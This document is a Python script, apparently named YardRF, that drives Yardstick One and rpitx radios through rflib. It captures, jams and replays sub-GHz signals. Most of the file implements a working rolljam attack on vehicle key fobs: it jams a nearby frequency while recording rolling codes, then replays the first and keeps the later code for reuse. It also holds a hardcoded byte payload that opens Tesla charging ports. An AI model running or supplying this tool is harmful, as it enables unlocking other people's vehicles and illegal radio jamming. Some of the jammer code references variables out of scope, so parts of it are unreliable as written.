from rflib import *
import argparse, bitstring, time
import subprocess

def main():
    parser = argparse.ArgumentParser(description="YardRF is for your capturing/replaying/rolljam fun")
    parser.add_argument('-f', '--frequency', help='Specify frequency to listen on [default: 433.92MHz (433920000)]', default=433920000, type=int)
    parser.add_argument('-m', '--modulation', help='Specify modulation type [default: ASK_OOK] example: 2fsk', default='MOD_ASK_OOK')
    parser.add_argument('-b', '--baudrate', help='Specify sample rate, baudrate [default: 4800] example: 4000', default=4800, type=int)
    parser.add_argument('-d', '--deviation', help='Specify deviation [default: 0] examples: 2.380371, 47.60742, 29.30', default=0, type=float)
    parser.add_argument('-s', '--channel_spacing', help='Specify Channel Spacing [Default: 24000]', type=int, default=24000)
    parser.add_argument('-cb', '--channel_bandwidth', help='Specify channel bandwidth [default: 750000]', default=750000, type=int)
    parser.add_argument('-bs', '--blocksize', help='Specify capture blocksize [default: 400]', default=400, type=int)
    parser.add_argument('-min', '--minRSSI', help='Specify minimum rssi db to accept signal [default: -100]', default=-100, type=int)
    parser.add_argument('-max', '--maxRSSI', help='Specify maximum rssi db to accept signal [default 40]', default=40, type=int)
    parser.add_argument('-n', '--number', help='Specify number of signals to send [Default: 1 transmission]', default=1, type=int)
    parser.add_argument('-o', '--output', help='Specify name of output file to replay captured signals [.cap file extension]', required=False)
    parser.add_argument('-c', '--cap', help='Specify cap file to replay previously captured signals', required=False)
    parser.add_argument('-l', '--limit', help='Specify capture limit [Default 2]', default=2, required=False, type=int)
    parser.add_argument('-rj', '--rolljam', help='Enable to send 1st capture, THEN second whenever specified', required=False, action='store_true')
    parser.add_argument('-a', '--auto', help='Enable to automatically send captures/cap files / Use in conjunction with -rj/--rolljam to send the first signal automatically', action='store_true', required=False)
    parser.add_argument('-rpiJ', '--rpitx_jammer', help='Enable jammer with rpitx by specifying rpitx directory [ie. ~/Documents/rpitx]', required=False, type=str)
    parser.add_argument('-ysJ', '--yardstick_jammer', help='Enable jammer with an EXTRA yardstick one', required=False, action='store_true')
    parser.add_argument('-tesla', '--tesla_port', help='Specify country to send tesla charging port signal example: US, EU/AUS', required=False, type=str)

    args = parser.parse_args()
    baudrate = args.baudrate
    deviation = args.deviation
    channel_spacing = args.channel_spacing
    channel_bandwidth = args.channel_bandwidth
    frequency = args.frequency
    modulation = args.modulation
    bs = args.blocksize
    minRSSI = args.minRSSI
    maxRSSI = args.maxRSSI
    number = args.number
    output = args.output
    cap = args.cap
    limit = args.limit # for me to capture my unlock signal, I needed the limit to be 2 minimum.. as the sync and unlock are two different signals??
    rolljam = args.rolljam
    auto = args.auto
    rpitxJ = args.rpitx_jammer
    ysJ = args.yardstick_jammer
    country = args.tesla_port

    if country != None:
        teslaPortOpener(country, number)
        print("[*] Tesla Port should be Opened Boss ;)\n")
        exit(0)

    ##some sanity check
    # no medical frequency ranges please
    if (frequency >= 400000000) and (frequency <= 416000000):
        print("[*] Sorry, Medical frequency ranges are NOT permitted..\n")
        exit(0)

    # config with given settings
    print("[*] Configuring Settings..\n")
    d = RfCat(idx=0)
    d.setFreq(frequency)
    if modulation=="2FSK" or modulation == "2fsk":
        d.setMdmModulation(MOD_2FSK) # my vehicle used 2fsk but may be ASKOOK for older cars
    else:
        d.setMdmModulation(MOD_ASK_OOK)
    d.setMdmDRate(baudrate)
    d.setMdmChanSpc(channel_spacing)
    d.setMdmChanBW(channel_bandwidth)
    d.setMdmSyncMode(0)
    d.setChannel(0)
    if (deviation != 0):
        d.setMdmDeviatn(deviation) # for my vehicle, my deviation needed to he 4760, but 2930 is also what I have seen work on other vehicles 
    d.setMaxPower() # max power
    d.lowball(0) #?? need it to read data??

    # read from cap file
    if cap:
        with open(cap, 'r') as file:
            signals = [capture.rstrip() for capture in file]

    else:
        # a little iffy in terms of jamming so may need to do so manually in another terminal
        # manual jamming: cd <rpitx directory>
        # sudo ./sendiq -f <frequency - 80000> -t u8 -s 250000 -i jammer.iq
        # CTRL-C to stop
        # start jamming with rpitx if specified
        if rpitxJ != None:
            print("[*] Starting Jammer with rpitx\n -  Frequency: " + str(frequency - 80000))
            proc = rpitxJammer(frequency, rpitxJ)
            signals = captureSignal(d, minRSSI, maxRSSI, limit, bs)
            proc.kill() # stop jammer
            print("[*] Jammer is done transmitting")
            # give time to stop pressing fob
            time.sleep(1)
        # jam with other yardstick if specified
        elif ysJ:
            # start jammer
            print("[*] Starting jammer with other ys1\n")
            yardJammer(frequency)
            signals = captureSignal(d, minRSSI, maxRSSI, limit, bs)
            print("[*] Stopping Jammer..")
            c.setModeIDLE()
            print(" -  Jammer is done transmitting\n")
        else:
            # if no roll jamming just capture signal
            signals = captureSignal(d, minRSSI, maxRSSI, limit, bs)

    # save captures to a file
    if output:
        with open(output, 'w') as file:
            for signal in signals:
                file.write(signal + '\n')

    d.setModeIDLE() # gotsto coach

    print("[*] Formatting each signal captured..\n")
    payloads = formatCapture(d, signals)
    emptyKey = b'\x00\x00\x00\x00\x00\x00'
    d.makePktFLEN(len(emptyKey))
    d.RFxmit(emptyKey) # transmit mode // ys1 bugs out so sometimes so I put it in there

    if rolljam:
        if not auto:
            input("[ENTER TO SEND PAYLOAD]")
        print("[*] Rolljam enabled, so only sending first capture..\n")
        d.makePktFLEN(len(payloads[0]))
        d.RFxmit(payloads[0] + emptyKey * number)
        print("[PACKET SENT] Payload transmittion completed..\n")

        input("[ENTER TO SEND OTHER PAYLOAD]")
        for x in range(1, len(payloads)):
            d.makePktFLEN(len(payloads[x]))
            d.RFxmit(payloads[x] + emptyKey * number)
            print("[PACKET SENT] Payload transmittion completed..\n")
    else:
        if not auto:
            input("[ENTER TO SEND PAYLOAD]")
        print("[*] Replaying all captured signals..\n")
        for x in range(0, len(signals)):
            d.makePktFLEN(len(payloads[x]))
            d.RFxmit(payloads[x] + emptyKey * number)
            print("[PACKET SENT] Payload transmittion completed..\n")

    print("[*] All captures were sent successfully..")
    d.setModeIDLE()


def captureSignal(d, minRSSI, maxRSSI, limit, bs):
    signals = []
    x = 0
    print("[*] Live Packet Capture: \n")
    while x < limit:
        try:
            capture, t = d.RFrecv(timeout=1, blocksize=bs) # when testing on my vehicle, i needed the blocksize to be 475 
            cap = capture.hex()
#            cap = capture.encode('hex') # for python2

            strength = 0 - ord(d.getRSSI())

# Giving issues in terms of not appending the sync and so forth. So commenting it out until then
#           if (strength > minRSSI and strength < maxRSSI):

            # try to filter some noise
            if (cap.count('f') < 450) and (cap.count('0') < 450):
                print(cap)
                print('[*] Signal Strength: ' + str(strength))
                signals.append(cap)
                print('-' * 20)
                x += 1

        except ChipconUsbTimeoutException:
            pass
        except KeyboardInterrupt:
            d.setModeIDLE()
            break;

    return signals

# jam wit yardstick
def yardJammer(frequency):
    c = RfCat(idx=1)
    c.setMdmModulation(MOD_ASK_OOK) #ask for jammer
    offset = frequency - 80000
    if offset < 300000000:
        offset = frequency + 80000
    c.setFreq(offset)
    c.setMdmDRate(baudrate)
    c.setMdmChanBW(channel_bandwidth)
    c.setMdmChanSpc(channel_spacing)
    c.setChannel(0)
    c.setMaxPower() # max power
    c.lowball(0)
    c.setRFRegister(PKTCTRL1, 0xFF)
    c.setModeTX()

    return c

# jam wit rpitx
def rpitxJammer(frequency, rpitxJ):
    # frequency offset of -80000, change as necessary
    freqOffset = frequency - 80000
    if freqOffset < 300000000:
        freqOffset = frequency + 80000
    # rpitx must be ran with root for me..
    # Prerequisite: jammer.iq file must be in rpitx directory.. lazy right now 
    proc = subprocess.Popen(["cd", rpitxJ, "&&", "sudo", "./sendiq", "-s","250000", "-f", str(freqOffset), "-t", "u8", "-i", "jammer.iq"], stdout=open('/dev/null', 'w'), stderr=open('/dev/null', 'a'), shell=True, preexec_fn=os.setpgrp)

    return proc

def formatCapture(d, signals):
    payloads = []
    for signal in signals:
        payload = bitstring.BitArray(hex=signal).tobytes()
        payloads.append(payload)

    return payloads

# Credits to pickeditmate
# - https://github.com/pickeditmate
def teslaPortOpener(country, number):
    d = RfCat(idx=0)
    d.setMdmModulation(MOD_ASK_OOK)
    if country == 'US':
        d.setFreq(315000000)
    else:
        d.setFreq(433920000)
    d.setMdmDRate(2500)
#    d.setMaxPower()
    d.setAmpMode(1)
    print("[*] Sending Payload\n")
    for x in range(0, number):
        d.RFxmit(b'\x15\x55\x55\x51\x59\x4C\xB5\x55\x52\xD5\x4B\x4A\xD3\x4C\xAB\x4B\x15\x94\xCB\x33\x33\x2D\x54\xB4\x56\x9A\x65\x5A\x48\xAC\xC6\x59\x99\x99\x69\xA5\xB2\xB4\xD4\x2A\xD2\x80' * 5)
    d.setModeIDLE()

main()